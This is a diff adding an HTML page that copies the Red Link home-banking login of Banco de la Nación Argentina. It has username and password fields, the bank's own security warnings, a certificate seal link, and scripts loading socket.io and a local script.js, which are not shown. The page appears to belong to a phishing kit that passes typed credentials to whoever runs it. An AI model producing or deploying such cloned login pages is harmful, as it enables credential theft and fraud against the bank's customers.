@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red Link - BANCO DE LA NACIÓN ARGENTINA</title>
+    <link rel="shortcut icon" href="/img/icono.png" type="image/x-icon">
+    <link rel="stylesheet" href="/css/index-desktop.css">
+    <script>
+        if(screen.width<767){
+            window.location.href = "/login.htm";
+        }
+    </script>
+</head>
+<body id="body">
+    <div id="menu-bar">
+        <div class="nav">
+            <ul>
+                <li>
+                    <a href="#" id="PFnav" alt="Preguntas Frecuentes" title="Preguntas Frecuentes">
+                        Preguntas Frecuentes
+                    </a>
+                </li>
+                <li>
+                    <a href="#" id="INFnav" alt="Información de Home Banking" title="Información de Home Banking">
+                        Información de Home Banking
+                    </a>
+                </li>
+                <li>
+                    <a href="#" id="TCnav" alt="Términos y Condiciones" title="Términos y Condiciones">
+                        Términos y Condiciones
+                    </a>
+                </li>        
+                <li>
+                    <a href="#" id="SSnav" alt="Seguridad del Sistema" title="Seguridad del Sistema">
+                        Seguridad del Sistema
+                    </a>
+                </li>        
+            </ul>	
+        </div>
+    </div>
+
+    <div id="login-box">
+        <div class="login-header"></div>
+        <div class="user-info" id="user-content"> 
+            <div class="label-user">
+                <label for="usuario">Usuario</label>
+                <img src="/img/preg_circle.gif">
+            </div>
+            <input type="text" id="user" autocomplete="off" class="input" name="username">
+        </div>
+        <div class="user-info pass" id="password-content">
+            <div class="label-user pass">
+                <div class="teclado-img">
+                    <div class="teclado-virual">
+                        Ingrese con Teclado Virtual <input type="checkbox" id="">
+                    </div>
+                    <label for="password">Clave</label>
+                </div>
+                <div class="imagen">
+                    <div></div>
+                    <img src="/img/spinner-general.gif">
+                </div>
+            </div>
+            <input type="password" id="pass" class="input" name="password">        
+        </div>
+        <button id="btn-send">ingresar</button>
+        <a href="#" class="primera-vez">¿Primera vez que ingresás?</a>
+    </div>
+    <div id="alerta">
+        <p>Nunca ingrese los 81 datos de su tarjeta de coordenadas en una misma pantalla. En caso de haber ingresado esta información comuníquese al (011)4319-5465IMPORTANTE: El Banco de la Nación Argentina "NUNCA" le solicita que informe o confirme sus claves o datos a través de un correo electrónico.
+        <b>CONSEJOS DE USO</b>
+        : • Para operar este servicio Ud. necesita su Usuario y Clave Internet Home Banking. Si no cuenta con estos datos, le recordamos que se obtienen en cualquier cajero automático de la Red Link. • Al acceder al sistema, ingresará a un sitio seguro. Es conveniente comprobar la autenticidad del sitio. Para ello, basta con pulsar sobre el ícono del candado que se encuentra en la parte inferior del navegador. Al ingresar al candado, se desplegará la información del certificado. Verifique que en la ruta del certificado figure homebanking.redlink.com.ar. • Utilice Home Banking sólo desde su computadora personal o su trabajo, evite el uso desde otras computadoras para realizar operaciones financieras (Ej: Cibercafé, locutorio, etc.).
+        </p>
+        <a href="http://www.redlink.com.ar" target="_blank" class="LogoCircular">
+            <img class="circularLogo" src="/img/icon.jpg" width="55" alt="RED LINK">
+        </a>
+        <div class="seguridad">
+            <div title="Haga Click para Verificar - Este sitio cuenta con un Certificado SSL para asegurar la confidencialidad de sus comunicaciones.">
+
+            <a href="https://seal.certisur.com/getseal?host_name=hb.redlink.com.ar&amp;lang=es&amp;version=CURS-3.0&amp;domain=imagen&amp;ca=norton" target="_blank" class="certificado">
+                <img src="/img/cetificado.png" alt="CertiSur Seal" width="100" height="72" class="certificado">
+            </a>
+            </div>
+        </div>
+    </div>
+    <div id="alert-modal">
+        <div>
+            <p>El nombre de usuario ingresado tiene un formato incorrecto, por favor ingréselo nuevamente</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal">
+            <b>cerrar</b> <img src="/img/bt.cerrar.modal.gif">
+        </div>
+    </div>  
+    <div id="alert-modal-2">
+        <div style="min-width: 374px;">
+            <p>Acceso incorrecto al Sistema</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal-2">
+            <b>cerrar</b> <img src="/img/bt.cerrar.modal.gif">
+        </div>
+    </div>    
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/script.js"></script>
+</body>
+</html>
